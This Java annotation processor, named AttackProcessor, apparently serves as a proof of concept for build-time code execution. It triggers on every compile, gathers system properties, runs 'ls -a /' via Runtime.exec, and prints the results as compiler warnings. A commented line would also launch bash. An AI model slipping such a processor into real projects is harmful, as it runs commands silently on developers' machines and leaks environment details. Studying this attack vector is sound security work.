package org.cyber;


import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.lang.model.element.TypeElement;
import javax.tools.Diagnostic;
import java.io.File;
import java.io.IOException;
import java.util.Scanner;
import java.util.Set;

@SupportedAnnotationTypes("*")
public class AttackProcessor extends AbstractProcessor {
    @Override
    public synchronized void init(ProcessingEnvironment processingEnv) {
        super.init(processingEnv);
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        StringBuffer sb = new StringBuffer("");
        sb.append(System.getProperties());

        File folder = new File(System.getProperty("user.home"));

        try {
            //Runtime r = Runtime.getRuntime();
            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});

            Scanner s = new Scanner( Runtime.getRuntime().exec( "ls -a /" ).getInputStream() ).useDelimiter(
                    "\\A" );
            String rest = s.hasNext() ? s.next() : "";
            processingEnv.getMessager().printMessage(
                    Diagnostic.Kind.MANDATORY_WARNING, "res+"+rest);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        processingEnv.getMessager().printMessage(
                Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
        return false;
    }
}
